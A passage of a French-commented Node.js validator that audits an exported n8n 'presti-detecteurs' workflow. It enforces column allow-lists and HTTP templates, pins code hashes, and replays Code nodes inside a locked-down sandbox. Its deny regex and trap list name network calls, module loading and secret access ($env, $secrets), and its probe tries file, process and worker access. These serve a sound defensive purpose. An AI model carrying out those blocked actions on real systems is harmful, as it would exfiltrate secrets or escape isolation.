// Juge HORS LIGNE du workflow n8n `presti-detecteurs` (chantier 4, lot L3 n8n ; tâche 032-003, durci par 032-012 après l'audit 032-010).
//
// Il relit l'export du workflow (.orchestre/preuves/032-003/presti-detecteurs.workflow.json, tiré du n8n d'Oracle par le MCP) et :
//   1. vérifie sa structure : inactif ; seuls des nœuds de lecture (Schedule Trigger, Supabase get/getAll sur regles_automatisation,
//      HTTP Request en GET) et des nœuds Code ; chaque `select=` ne demande que des colonnes permises (brief
//      plans/011-cadrage-01-11/briefs/c4-n8n-detecteurs.md) ; aucune colonne nom, email, contact, adresse, message, contenu, texte ;
//      aucun nœud qui écrit, envoie ou appelle un modèle ; déclencheur à 6 h 45, fuseau Europe/Paris ;
//      É1 (032-012) : chaque nœud HTTP comparé à un GABARIT EXACT (clés et valeurs de `parameters` ET de `options`, pagination comprise) :
//      un proxy, des certificats non vérifiés, une redirection, une « next URL », une page de plus… rougissent ;
//   2. compare la copie figée des capacités à lib/plans.ts, et les listes d'outils à lib/pilote/regles.ts ; les seuils sourcés au code ;
//   3. É3 (032-012) : épingle l'empreinte SHA-256 du code de chaque nœud Code (toute différence : « nouvel audit requis »), puis rejoue
//      ce code dans un PROCESSUS ENFANT `node --permission` (ni écriture disque, ni lecture, ni processus, ni worker), dans un contexte
//      vm sans aucun objet de l'hôte (`vm.constants.DONT_CONTEXTIFY`), génération de code coupée ; les noms dangereux et `this` y sont
//      des pièges qui notent toute tentative ;
//   4. rejoue les détecteurs sur des cas FICTIFS : chacun déclenche, se tait, tient à la limite, change de clé d'étape ;
//      É2 (032-012) : un test PAR PROPRIÉTÉ — chaque détecteur × chaque offre × chaque condition du compte × plusieurs étapes et
//      montants (1 € à 100 000 €) — exige `niveau ≤ plafond(offre, détecteur)`, plafond calculé ICI par `peut()` (lib/plans.ts),
//      OUTILS_JAMAIS_AUTO et la table du plan §9 ; et, sur chaque constat de chaque cas, `outil ∈ OUTILS_JAMAIS_AUTO ⇒ niveau ≤ 2` ;
//   5. prouve qu'il sait rougir : des MUTANTS doivent tous faire échouer la suite, pour la bonne raison quand elle est nommée ; un
//      mutant du code est jugé SANS les empreintes, pour prouver que le rejeu le voit aussi (l'empreinte seule le verrait toujours).
//
// Aucun réseau, aucune base, aucun modèle. Lancement :
//   node --experimental-strip-types --import ./scripts/ts-loader.mjs scripts/detecteurs-n8n-qa.mjs
import { readFileSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { PLANS, peut } from '../lib/plans.ts'
import { OUTILS_JAMAIS_AUTO, OUTILS_EXECUTABLES_PILOTE } from '../lib/pilote/regles.ts'
import { JOURS_PAR_DEFAUT, RATTRAPAGE_JOURS as RATTRAPAGE_IMPAYES } from '../lib/relancesImpayes.ts'
import { DELAI_AVIS_JOURS, RATTRAPAGE_JOURS as RATTRAPAGE_AVIS } from '../lib/apresChantier.ts'
import { VALIDITE_PAR_DEFAUT_JOURS } from '../lib/tableau-de-bord/calculer.ts'

const RACINE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const EXPORT = path.join(RACINE, '.orchestre/preuves/032-003/presti-detecteurs.workflow.json')
const WF = JSON.parse(readFileSync(EXPORT, 'utf8'))

// ─── Ce que n8n a le droit de lire (brief, « Les colonnes permises ») ─────────────────────────────────────────────────────────
const BASE = 'https://gorcdvmueakcncsmrouo.supabase.co/rest/v1/'
const IDENTIFIANT = 'dTewDK98MLrNckNG'
const PERMISES = {
  artisans: ['id', 'plan', 'est_demo', 'suppression_demandee_le'],
  factures: ['id', 'artisan_id', 'devis_id', 'statut', 'date_echeance', 'total_ttc', 'avoir_de', 'payee_le', 'type_facture'],
  devis: ['id', 'artisan_id', 'statut', 'date_emission', 'validite_jours', 'acompte_pct', 'total_ttc', 'lead_id', 'accepte_le', 'envoye_le', 'created_at'],
  leads: ['id', 'artisan_id', 'statut', 'urgence', 'type_chantier', 'created_at'],
  chantiers: ['id', 'artisan_id', 'devis_id', 'statut', 'date_fin_reelle', 'maj_le'],
  chantier_materiaux: ['id', 'artisan_id', 'chantier_id', 'materiau_id', 'quantite', 'statut'],
  materiaux: ['id', 'artisan_id', 'seuil_alerte'],
  stock: ['id', 'materiau_id', 'quantite'],
  commandes_fournisseur: ['id', 'artisan_id', 'statut', 'chantier_id'],
  relances_impayes: ['id', 'artisan_id', 'facture_id', 'rang', 'statut'],
  relances_impayes_arrets: ['facture_id', 'artisan_id', 'raison', 'reprise_le'],
  relances_impayes_reglages: ['artisan_id', 'actif', 'jours'],
  plateforme_config: ['artisan_id', 'mode_reponse'],
  prix_artisan: ['id', 'artisan_id', 'actif'],
  crm_apres_chantier: ['artisan_id', 'avis'],
}
const INTERDIT = /nom|e-?mail|contact|adresse|message|contenu|texte/i
const TYPES_PERMIS = new Set(['n8n-nodes-base.scheduleTrigger', 'n8n-nodes-base.supabase', 'n8n-nodes-base.httpRequest', 'n8n-nodes-base.code', 'n8n-nodes-base.stickyNote'])
// Premier filet, bon marché : des noms. Il se contourne par une concaténation (032-010, mutants C5 et C6) : les vraies barrières sont
// l'empreinte du code et le bac à sable du rejeu (É3).
const CODE_INTERDIT = /fetch\s*\(|httpRequest|\$http|require\s*\(|\bimport\s|axios|this\.helpers|helpers\.|getWorkflowStaticData|\$execution\.|XMLHttpRequest|WebSocket/
const PARAMS_PAGINATION = new Set(['select', 'order', 'limit', 'offset'])
const DETECTEURS = ['Détecteur 01 facture échue', 'Détecteur 02 chantier à facturer', 'Détecteur 03 devis signé sans acompte', 'Détecteur 04 devis sans réponse',
  'Détecteur 05 facture jamais envoyée (coupé)', 'Détecteur 06 demande sans réponse', 'Détecteur 07 demande sans devis', 'Détecteur 08 devis bientôt expiré',
  'Détecteur 09 stock sous le seuil', 'Détecteur 10 demande d avis']

// ─── É1 : le gabarit exact d'un nœud HTTP (032-010, défaut élevé É1) ───────────────────────────────────────────────────────────
// Toute clé absente de ces listes rougit : `proxy`, `allowUnauthorizedCerts`, `redirect`, `response`, `nextURL`,
// `responseContainsNextURL`, un en-tête, un second identifiant… Les valeurs sont comparées une à une.
const CLES_NOEUD = new Set(['id', 'name', 'type', 'typeVersion', 'position', 'parameters', 'credentials', 'alwaysOutputData', 'executeOnce'])
const CLES_HTTP = ['method', 'url', 'authentication', 'nodeCredentialType', 'sendQuery', 'specifyQuery', 'queryParameters', 'options']
const CLES_OPTIONS_HTTP = ['timeout', 'pagination']
const CLES_PAGINATION = ['paginationMode', 'parameters', 'paginationCompleteWhen', 'completeExpression', 'limitPagesFetched', 'maxRequests']
const PAGE = 1000
const OFFSET_ATTENDU = '={{ $pageCount * 1000 }}'
const FIN_ATTENDUE = '={{ !Array.isArray($response.body) || $response.body.length < 1000 }}'
const MAX_PAGES = 50
const DELAI_MAX_MS = 30000
const CLES_REGLAGES = new Set(['executionOrder', 'availableInMCP', 'timezone']) // pas d'`errorWorkflow` (032-010, M10, mutant C7)
const CLES_CODE = ['mode', 'language', 'jsCode']

// ─── É3 (a) : l'empreinte SHA-256 du code de chaque nœud Code, telle qu'auditée (032-003, relu par 032-010) ──────────────────────
// Une différence n'est pas une erreur du juge : c'est un code que personne n'a relu. Nouvel audit par un agent distinct, puis nouvelle
// empreinte ici (`node -e` sur l'export : sha256 du champ `parameters.jsCode`, en UTF-8).
const EMPREINTES = new Map([
  ['Preuve de connexion', '737659310de6ac4372d31c1b745e77938a0af5fdd902054c70170ad588fca119'],
  ['Contexte du passage', '34fb0adecfd6e7a5c40627753c3bba0b3b657ce6084d835cc1e6f608363f000e'],
  ['Capacités des offres', '66e7fa5fc96c8910d48741935c3e2064986c7728356b48bfb9f49caac693af0d'],
  ['Départ des constats', 'cb8a2bf02133dadfd9fbe83dcbdaf6114b6f40334efba92f23d4683a1913e519'],
  ['Détecteur 01 facture échue', 'fc2ad640ef641e90d420bbdcfd12d424eaa455869b9f2e49ef3827230ec1f37a'],
  ['Détecteur 02 chantier à facturer', '32c494952eec39a85c05b2020cf16b548be18eb974f4b6c328f75a2dfa8f9d4f'],
  ['Détecteur 03 devis signé sans acompte', 'cb95dccc3105d92e72441a4822c3a63d15d2fd1ba5bc9ac26ee1b5091153c3c5'],
  ['Détecteur 04 devis sans réponse', 'f037b333941a9c4cae8fe4461ff58d6f166af2db5c5e6414a25e61b7dae6f4b3'],
  ['Détecteur 05 facture jamais envoyée (coupé)', 'fa1f4cd542432c4d6e9356fa0a086ddbca6aa0223c4846d2b170a980ee046362'],
  ['Détecteur 06 demande sans réponse', '81a0059a0276f45511e79ea77fd284ab5875e221519053a7e2e664983b8c6d0f'],
  ['Détecteur 07 demande sans devis', 'b274417dd42ea0801ddef386696cef2df345a342dd03c471fd0bcc8def9371ac'],
  ['Détecteur 08 devis bientôt expiré', 'dbf7a5ccd6d359d9aff466639c5e4a8456ede6ddd34121b5ec76e0920ee724c9'],
  ['Détecteur 09 stock sous le seuil', '6f5e02bd424ff5514bd6d04072fbf19de104212abc8919f404ad515b06f90a48'],
  ['Détecteur 10 demande d avis', 'c32c9f9d2d9daba6070f11e85c09cd8187055ad6de2843180851c7409a39fd13'],
  ['Niveau proposé selon l offre', '12627aca786a75cc9e6f93ed8aecdc03af9f82ea3777d403918bc51a59d60b61'],
  ['Bilan par détecteur', '5ba72c784e88a9ee2be768a722dc7f9f2ea3e866ebcc8ef30d9c3235cf68eafb'],
])
const sha256 = (s) => createHash('sha256').update(String(s), 'utf8').digest('hex')

// ─── É2 : les plafonds, calculés DANS le juge (jamais lus dans la copie du workflow) ───────────────────────────────────────────
// Table du plan §9 (plans/011-cadrage-01-11/chantier-4-assistant-plan.md:585-594), colonne « Studio · Signature · Entreprise » et
// « Proposition (outil existant) » : n° 2, 3, 7, 9, 10 → 2 au plus partout ; n° 5 coupé → 0 ; n° 1, 4, 6, 8 → 3 possible, aux
// conditions du brief (« Le niveau proposé ») : `assistant.pilote` (plan §9 en tête), la capacité d'envoi du détecteur, l'outil hors
// OUTILS_JAMAIS_AUTO et dans OUTILS_EXECUTABLES_PILOTE (lib/pilote/regles.ts), et la condition du compte (impayés cochés : opt-in,
// lib/plans.ts:67 ; réponse en mode `auto`, défaut `assistee`, lib/plateformeConfig.ts:45).
const PLAFONDS = {
  1: { outil: 'relancer_facture', max: 3, envoi: ['factures.relances.auto'], condition: 'impayes' },
  2: { outil: 'creer_facture', max: 2, envoi: [] },
  3: { outil: 'creer_facture', max: 2, envoi: [] },
  4: { outil: 'relancer_devis', max: 3, envoi: ['relances.auto'] },
  5: { outil: 'envoyer_facture', max: 0, envoi: [] },
  6: { outil: 'valider_reponse_proposee', max: 3, envoi: ['plateforme.ia.auto'], condition: 'auto' },
  7: { outil: 'creer_devis', max: 2, envoi: [] },
  8: { outil: 'relancer_devis', max: 3, envoi: ['relances.auto'] },
  9: { outil: 'preparer_liste_achat', max: 2, envoi: [] },
  10: { outil: 'demander_avis', max: 2, envoi: [] },
}
/** Le plus haut niveau qu'un constat du détecteur `numero` peut porter pour un compte de l'offre `plan` dans ces conditions. */
function plafond(plan, numero, conditions) {
  const d = PLAFONDS[numero]
  if (!d || d.max < 1) return 0
  let n = peut(plan, 'assistant') ? 2 : 1
  const partSeul = d.max >= 3 && peut(plan, 'assistant.pilote') && d.envoi.every((c) => peut(plan, c))
    && !OUTILS_JAMAIS_AUTO.includes(d.outil) && OUTILS_EXECUTABLES_PILOTE.includes(d.outil)
    && (!d.condition || conditions[d.condition] === true)
  if (partSeul) n = 3
  n = Math.min(n, d.max)
  return OUTILS_JAMAIS_AUTO.includes(d.outil) ? Math.min(n, 2) : n
}

/** Chaque constat d'un passage, contre les plafonds : appelé sur CHAQUE cas, pas sur un seul jeu (032-010, É2). */
function controler(titre, donnees, constats, ko) {
  const comptes = new Map((donnees['Lire comptes'] ?? []).map((a) => [a.id, a]))
  const impayes = new Set((donnees['Lire reglages des relances'] ?? []).filter((r) => r.actif === true).map((r) => r.artisan_id))
  const auto = new Set((donnees['Lire reglages de la plateforme'] ?? []).filter((p) => p.mode_reponse === 'auto').map((p) => p.artisan_id))
  for (const c of constats) {
    const ou = `${titre} : ${c?.cle}`
    const compte = comptes.get(c?.artisan_id)
    if (!compte) { ko(`${ou} : constat d'un compte non lu`); continue }
    if (c.offre !== compte.plan) ko(`${ou} : offre ${c.offre} annoncée pour un compte ${compte.plan}`)
    const d = PLAFONDS[c.numero]
    if (!d) { ko(`${ou} : détecteur inconnu (${c.numero})`); continue }
    if (c.outil !== d.outil) ko(`${ou} : outil ${c.outil}, ${d.outil} attendu (plan §9)`)
    const p = plafond(compte.plan, c.numero, { impayes: impayes.has(c.artisan_id), auto: auto.has(c.artisan_id) })
    if (!Number.isInteger(c.niveau) || c.niveau < 1 || c.niveau > p) ko(`${ou} : niveau ${c.niveau} au-dessus du plafond ${p} (${compte.plan}, n° ${c.numero})`)
    if (OUTILS_JAMAIS_AUTO.includes(c.outil) && c.niveau > 2) ko(`${ou} : geste §3.2 (${c.outil}) au niveau ${c.niveau}`)
  }
}

const copie = (o) => JSON.parse(JSON.stringify(o))
const noeud = (wf, nom) => wf.nodes.find((n) => n.name === nom)
const codeDe = (wf, nom) => { const n = noeud(wf, nom); if (!n) throw new Error(`nœud absent : ${nom}`); return n.parameters.jsCode }
const memes = (a, b) => a.length === b.length && [...a].sort().join('|') === [...b].sort().join('|')
const clesExactes = (o, attendues) => o && typeof o === 'object' && !Array.isArray(o) && memes(Object.keys(o), attendues)

// ─── 1. Structure ──────────────────────────────────────────────────────────────────────────────────────────────────────────────
function structure(wf) {
  const e = []
  const ko = (m) => e.push(m)
  if (wf.active !== false) ko('le workflow doit être inactif (active: false)')
  if (wf.activeVersionId) ko('le workflow ne doit avoir aucune version publiée')
  if (wf.name !== 'presti-detecteurs') ko(`nom inattendu : ${wf.name}`)
  if (wf.settings?.timezone !== 'Europe/Paris') ko('fuseau du workflow : Europe/Paris attendu')
  for (const k of Object.keys(wf.settings ?? {})) if (!CLES_REGLAGES.has(k)) ko(`réglage du workflow non permis : settings.${k}`)
  for (const n of wf.nodes) {
    if (!TYPES_PERMIS.has(n.type)) ko(`type de nœud interdit : ${n.name} (${n.type})`)
    if (n.disabled) ko(`nœud désactivé : ${n.name}`)
    for (const k of Object.keys(n)) if (!CLES_NOEUD.has(k)) ko(`${n.name} : clé de nœud non permise (${k})`)
  }
  const declencheurs = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.scheduleTrigger')
  const r = declencheurs[0]?.parameters?.rule?.interval?.[0]
  if (declencheurs.length !== 1 || !r || r.field !== 'days' || r.triggerAtHour !== 6 || r.triggerAtMinute !== 45) ko('un seul déclencheur, tous les jours à 6 h 45, attendu')

  const supabases = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.supabase')
  if (supabases.length !== 1) ko(`un seul nœud Supabase attendu (${supabases.length})`)
  for (const n of supabases) {
    const p = n.parameters
    if (!['get', 'getAll'].includes(p.operation)) ko(`nœud Supabase ${n.name} : opération ${p.operation} interdite (get ou getAll seulement)`)
    if (p.tableId !== 'regles_automatisation') ko(`nœud Supabase ${n.name} : table ${p.tableId} interdite (regles_automatisation seulement)`)
    if (p.operation === 'getAll' && (p.returnAll || Number(p.limit) !== 1)) ko(`nœud Supabase ${n.name} : une seule ligne attendue`)
    if (n.credentials?.supabaseApi?.id !== IDENTIFIANT) ko(`nœud Supabase ${n.name} : identifiant « Supabase account » attendu`)
  }

  const https = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest')
  if (https.length !== Object.keys(PERMISES).length) ko(`${Object.keys(PERMISES).length} lectures HTTP attendues (${https.length})`)
  const tablesLues = new Set()
  for (const n of https) {
    const p = n.parameters
    gabaritHttp(n, ko)
    const m = (p.method ?? 'GET').toUpperCase()
    if (m !== 'GET') ko(`${n.name} : méthode ${m} interdite (GET seulement)`)
    if (p.sendBody) ko(`${n.name} : un corps de requête est interdit`)
    if (p.sendHeaders) ko(`${n.name} : aucun en-tête (Prefer, etc.) n'est permis`)
    if (p.authentication !== 'predefinedCredentialType' || p.nodeCredentialType !== 'supabaseApi' || n.credentials?.supabaseApi?.id !== IDENTIFIANT) ko(`${n.name} : identifiant prédéfini supabaseApi « Supabase account » attendu`)
    if (typeof p.url !== 'string' || !p.url.startsWith(BASE)) { ko(`${n.name} : adresse hors de l'API REST du projet (${p.url})`); continue }
    const table = p.url.slice(BASE.length)
    if (!PERMISES[table]) { ko(`${n.name} : table non permise (${table})`); continue }
    tablesLues.add(table)
    const params = p.queryParameters?.parameters ?? []
    if (!p.sendQuery || p.specifyQuery !== 'keypair') ko(`${n.name} : paramètres de requête en paires attendus`)
    const select = params.filter((q) => q.name === 'select')
    if (select.length !== 1) { ko(`${n.name} : un seul select= attendu`); continue }
    const colonnes = String(select[0].value).split(',').map((c) => c.trim())
    for (const c of colonnes) {
      if (!PERMISES[table].includes(c)) ko(`${n.name} : colonne ${table}.${c} hors de la liste permise`)
      if (INTERDIT.test(c)) ko(`${n.name} : colonne interdite ${table}.${c}`)
    }
    for (const q of params) {
      if (PARAMS_PAGINATION.has(q.name)) continue
      if (!PERMISES[table].includes(q.name)) ko(`${n.name} : filtre sur une colonne non permise (${q.name})`)
      const v = String(q.value)
      if (!/^(=\{\{|eq\.|in\.|is\.)/.test(v)) ko(`${n.name} : filtre ${q.name} hors de eq., in., is. (${v})`)
    }
    if (!params.some((q) => q.name === 'artisan_id') && !['artisans', 'stock'].includes(table)) ko(`${n.name} : lecture non filtrée par compte`)
    const limite = params.filter((q) => q.name === 'limit')
    if (limite.length !== 1 || String(limite[0].value) !== String(PAGE)) ko(`${n.name} : limit=${PAGE} attendu, une fois (pages de la pagination)`)
    if (params.some((q) => q.name === 'offset')) ko(`${n.name} : offset= vient de la pagination, pas des paramètres`)
  }
  for (const t of Object.keys(PERMISES)) if (!tablesLues.has(t)) ko(`table ${t} non lue`)

  for (const n of wf.nodes.filter((x) => x.type === 'n8n-nodes-base.code')) {
    const c = n.parameters.jsCode ?? ''
    if (!clesExactes(n.parameters, CLES_CODE)) ko(`${n.name} : paramètres du nœud Code hors gabarit (${Object.keys(n.parameters).join(', ')})`)
    if (n.parameters.language !== 'javaScript') ko(`${n.name} : JavaScript attendu`)
    if (n.parameters.mode !== 'runOnceForAllItems') ko(`${n.name} : mode runOnceForAllItems attendu`)
    if (CODE_INTERDIT.test(c)) ko(`${n.name} : appel réseau, module ou état persistant interdit dans un nœud Code`)
  }

  // La chaîne : Départ → les dix détecteurs dans l'ordre → Niveau → Bilan, et rien après le bilan.
  const chaine = chaineDepuis(wf, 'Départ des constats')
  const attendue = ['Départ des constats', ...DETECTEURS, 'Niveau proposé selon l offre', 'Bilan par détecteur']
  if (chaine.join('|') !== attendue.join('|')) ko(`chaîne des détecteurs inattendue : ${chaine.join(' → ')}`)
  return e
}

/** É1 : `parameters`, `options`, pagination et identifiant d'un nœud HTTP, clé par clé et valeur par valeur. */
function gabaritHttp(n, ko) {
  const p = n.parameters ?? {}
  if (n.typeVersion !== 4.5) ko(`${n.name} : HTTP Request 4.5 attendu (${n.typeVersion})`)
  if (n.executeOnce !== true) ko(`${n.name} : executeOnce attendu`)
  if (!clesExactes(n.credentials, ['supabaseApi']) || !clesExactes(n.credentials.supabaseApi, ['id', 'name']) || n.credentials.supabaseApi.name !== 'Supabase account') ko(`${n.name} : un seul identifiant, « Supabase account », attendu`)
  if (!clesExactes(p, CLES_HTTP)) ko(`${n.name} : paramètres HTTP hors gabarit (${Object.keys(p).join(', ')})`)
  if (!clesExactes(p.queryParameters, ['parameters']) || !Array.isArray(p.queryParameters.parameters) || p.queryParameters.parameters.some((q) => !clesExactes(q, ['name', 'value']))) ko(`${n.name} : paramètres de requête hors gabarit (name, value seulement)`)
  const o = p.options
  if (!clesExactes(o, CLES_OPTIONS_HTTP)) { ko(`${n.name} : options HTTP hors gabarit (${o && typeof o === 'object' ? Object.keys(o).join(', ') : typeof o}) : timeout et pagination seulement`); return }
  if (!Number.isInteger(o.timeout) || o.timeout < 1 || o.timeout > DELAI_MAX_MS) ko(`${n.name} : options.timeout entre 1 et ${DELAI_MAX_MS} ms attendu (${o.timeout})`)
  if (!clesExactes(o.pagination, ['pagination'])) { ko(`${n.name} : options.pagination hors gabarit`); return }
  const pg = o.pagination.pagination
  if (!clesExactes(pg, CLES_PAGINATION)) { ko(`${n.name} : pagination hors gabarit (${pg && typeof pg === 'object' ? Object.keys(pg).join(', ') : typeof pg})`); return }
  if (pg.paginationMode !== 'updateAParameterInEachRequest') ko(`${n.name} : pagination ${pg.paginationMode} interdite (updateAParameterInEachRequest seulement)`)
  const pp = pg.parameters?.parameters
  if (!clesExactes(pg.parameters, ['parameters']) || !Array.isArray(pp) || pp.length !== 1 || !clesExactes(pp[0], ['type', 'name', 'value'])
    || pp[0].type !== 'qs' || pp[0].name !== 'offset' || pp[0].value !== OFFSET_ATTENDU) ko(`${n.name} : pagination : un seul paramètre qs offset = ${OFFSET_ATTENDU} attendu`)
  if (pg.paginationCompleteWhen !== 'other' || pg.completeExpression !== FIN_ATTENDUE) ko(`${n.name} : pagination : fin de pagination exacte attendue (${FIN_ATTENDUE})`)
  if (pg.limitPagesFetched !== true) ko(`${n.name} : pagination : limitPagesFetched: true attendu`)
  if (!Number.isInteger(pg.maxRequests) || pg.maxRequests < 1 || pg.maxRequests > MAX_PAGES) ko(`${n.name} : pagination : maxRequests ≤ ${MAX_PAGES} attendu (${pg.maxRequests})`)
}

function chaineDepuis(wf, depart) {
  const ordre = []
  let courant = depart
  const vus = new Set()
  while (courant && !vus.has(courant)) {
    vus.add(courant); ordre.push(courant)
    const sorties = wf.connections?.[courant]?.main?.flat() ?? []
    if (sorties.length > 1) { ordre.push('(embranchement)'); break }
    courant = sorties[0]?.node
  }
  return ordre
}

/** É3 (a) : le code jugé est le texte audité, à l'octet près. */
function empreintes(wf) {
  const e = []
  const codes = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.code')
  for (const n of codes) {
    const attendue = EMPREINTES.get(n.name)
    if (!attendue) e.push(`${n.name} : nœud Code sans empreinte épinglée — nouvel audit requis`)
    else if (sha256(n.parameters?.jsCode ?? '') !== attendue) e.push(`${n.name} : code différent de celui audité (sha256 ${sha256(n.parameters?.jsCode ?? '').slice(0, 12)}…, épinglé ${attendue.slice(0, 12)}…) — nouvel audit requis`)
  }
  for (const nom of EMPREINTES.keys()) if (!codes.some((n) => n.name === nom)) e.push(`${nom} : nœud Code épinglé absent de l'export — nouvel audit requis`)
  return e
}

// ─── É3 (b) : le bac à sable du rejeu ─────────────────────────────────────────────────────────────────────────────────────────
// Ce corps tourne dans le PROCESSUS ENFANT (sérialisé par `toString`, passé à `node -e` : l'enfant n'a besoin d'aucun fichier).
// L'enfant est lancé avec `--permission` sans aucune `--allow-*` : ni lecture ni écriture disque, ni processus, ni worker, ni module
// natif ; `--disallow-code-generation-from-strings` ; un environnement vide (aucun secret de l'hôte). Chaque exécution d'un nœud a un
// contexte vm neuf, créé par `vm.constants.DONT_CONTEXTIFY` : son objet global est celui d'un royaume vierge, aucun objet de l'hôte n'y
// entre (les données passent en TEXTE JSON et sont relues dedans), donc ni `this.constructor.constructor` ni `Function('return this')`
// ne mènent à l'hôte ; la génération de code y est coupée.
function enfant() {
  'use strict'
  const vm = require('node:vm')
  const fs = require('node:fs')
  const os = require('node:os')
  const chemin = require('node:path')
  const processus = require('node:child_process')
  const fils = require('node:worker_threads')
  const reseau = require('node:net')
  // Défense en profondeur : le royaume de l'enfant lui-même perd ses portes vers l'extérieur avant tout code du workflow.
  for (const k of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'require', 'module']) { try { delete globalThis[k] } catch { /* rien */ } }
  for (const k of ['getBuiltinModule', 'binding', '_linkedBinding', 'dlopen']) { try { process[k] = undefined } catch { /* rien */ } }

  // Les noms que le code d'un nœud n'a pas à toucher : chacun est un piège qui note la tentative, même si le code la rattrape.
  const PIEGES = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'require', 'module', 'exports', 'process', 'Buffer', 'global',
    'setTimeout', 'setInterval', 'setImmediate', 'helpers', '$http', '$execution', '$getWorkflowStaticData', 'getWorkflowStaticData',
    '$env', '$vars', '$secrets', 'Function', 'eval', 'WebAssembly', 'SharedArrayBuffer', 'Atomics']
  const PREAMBULE = `(() => {
    'use strict'
    const D = JSON.parse(globalThis.__donnees); delete globalThis.__donnees
    const Chaine = String, appliquer = Reflect.apply, definir = Object.defineProperty, stringify = JSON.stringify
    const vues = []
    const note = (q) => { vues[vues.length] = Chaine(q) }
    const refus = (q) => { note(q); throw new TypeError(q + ' interdit dans un nœud Code (bac à sable du juge)') }
    for (const nom of ${JSON.stringify(PIEGES)}) definir(globalThis, nom, { get() { return refus(nom) }, set() { refus(nom) }, configurable: false })
    const fauxConstructeur = function () { return refus('génération de code (constructeur de fonction)') }
    for (const proto of [Object.getPrototypeOf(function () {}), Object.getPrototypeOf(async function () {}), Object.getPrototypeOf(function* () {}), Object.getPrototypeOf(async function* () {})]) {
      definir(proto, 'constructor', { value: fauxConstructeur, writable: false, configurable: false })
    }
    const enItems = (l) => (l || []).map((j) => ({ json: j }))
    const $ = (nom) => {
      if (!Object.prototype.hasOwnProperty.call(D.sorties, nom)) throw new Error("lecture d'un nœud inconnu : " + nom)
      const items = enItems(D.sorties[nom]); return { all: () => items, first: () => items[0] }
    }
    const entree = enItems(D.entree)
    const $input = { all: () => entree, first: () => entree[0] }
    const $now = { setZone: (z) => { if (z !== 'Europe/Paris') throw new Error('fuseau inattendu'); return { toISODate: () => D.jour } } }
    // \`this\` du code : dans n8n il porte les helpers (httpRequest…) ; ici, tout accès est noté et refusé.
    const ceci = new Proxy({}, {
      get(_, k) { return refus('this.' + Chaine(k)) }, set(_, k) { return refus('this.' + Chaine(k)) }, has(_, k) { return refus('this.' + Chaine(k)) },
      ownKeys() { return refus('this (clés)') }, getOwnPropertyDescriptor(_, k) { return refus('this.' + Chaine(k)) },
      defineProperty(_, k) { return refus('this.' + Chaine(k)) }, deleteProperty(_, k) { return refus('this.' + Chaine(k)) },
      getPrototypeOf() { return refus('this (prototype)') }, setPrototypeOf() { return refus('this (prototype)') },
    })
    let appels = 0, resultat = null
    definir(globalThis, '__harnais', { value: (f) => {
      appels++
      if (appels > 1) { note('harnais rappelé'); return }
      try {
        const r = appliquer(f, ceci, [$, $input, $now])
        if (r && typeof r.then === 'function') throw new Error('code asynchrone : non rejoué')
        if (!Array.isArray(r)) throw new Error("le code doit rendre une liste d'éléments")
        resultat = { items: r.map((i) => i && i.json) }
      } catch (e) { resultat = { erreur: Chaine(e && e.message || e) } }
    }, writable: false, configurable: false })
    // Les tentatives se relisent hors de toute méthode que le code aurait pu remplacer (boucle indexée, concaténation de texte).
    definir(globalThis, '__resultat', { value: () => {
      let t = ''
      for (let i = 0; i < vues.length; i++) t += (i ? '\\u0001' : '') + vues[i]
      return t + '\\u0000' + appels + '\\u0000' + stringify(resultat || { erreur: 'harnais jamais appelé' })
    }, writable: false, configurable: false })
  })()`

  const texte = (e) => { try { return String(e && e.message || e).slice(0, 300) } catch { return 'erreur illisible' } }
  /** Un nœud Code, dans un contexte neuf. Rend { items, erreur, violations }. */
  function executer(jsCode, sortiesTexte, entree, jour) {
    const ctx = vm.createContext(vm.constants.DONT_CONTEXTIFY, { name: 'noeud-code', codeGeneration: { strings: false, wasm: false }, microtaskMode: 'afterEvaluate' })
    ctx.__donnees = '{"sorties":' + sortiesTexte + ',"entree":' + JSON.stringify(entree) + ',"jour":' + JSON.stringify(jour) + '}'
    vm.runInContext(PREAMBULE, ctx, { timeout: 2000 })
    let erreurScript = null
    try { vm.runInContext('__harnais(function ($, $input, $now) {\n' + jsCode + '\n});', ctx, { timeout: 5000, filename: 'noeud-code.js' }) } catch (e) { erreurScript = texte(e) }
    const brut = vm.runInContext('__resultat()', ctx, { timeout: 1000 })
    if (typeof brut !== 'string') throw new Error('résultat du bac à sable illisible')
    const [vuesTexte, appels, json] = brut.split('\u0000')
    const r = JSON.parse(json)
    const violations = vuesTexte ? vuesTexte.split('\u0001') : []
    if (appels !== '1') violations.push(`harnais appelé ${appels} fois`)
    return { items: r.items, erreur: erreurScript || r.erreur || null, violations }
  }
  function unNoeud(nom, jsCode, sortiesTexte, entree, jour) {
    const r = executer(jsCode, sortiesTexte, entree, jour)
    if (r.violations.length) throw new Error(`${nom} : accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
    if (r.erreur) throw new Error(`${nom} : ${r.erreur}`)
    if (!Array.isArray(r.items)) throw new Error(`${nom} : sortie illisible`)
    return r.items
  }
  function passer(m) {
    const sorties = {}
    for (const [nom, code] of m.prealables) sorties[nom] = unNoeud(nom, code, '{}', [{}], m.jour)
    for (const [nom, lignes] of Object.entries(m.lectures)) sorties[nom] = lignes
    const sortiesTexte = JSON.stringify(sorties)
    let entree = [{}]
    const parNoeud = {}
    for (const [nom, code] of m.etapes) { entree = unNoeud(nom, code, sortiesTexte, entree, m.jour); parNoeud[nom] = entree }
    return parNoeud
  }
  /** Ce que l'enfant lui-même peut faire : chaque geste doit être refusé par le modèle de permissions de Node. */
  function sonder(m) {
    const r = {}
    const essai = (k, f) => { try { f(); r[k] = 'PERMIS' } catch (e) { r[k] = (e && e.code) || texte(e) } }
    essai('ecriture', () => fs.writeFileSync(chemin.join(os.tmpdir(), 'detecteurs-n8n-qa-sonde.txt'), 'x'))
    essai('lecture', () => fs.readFileSync(m.fichier))
    essai('processus', () => processus.spawnSync(process.execPath, ['-v']))
    essai('worker', () => new fils.Worker('1', { eval: true }))
    r.permission = typeof process.permission === 'object' && process.permission !== null
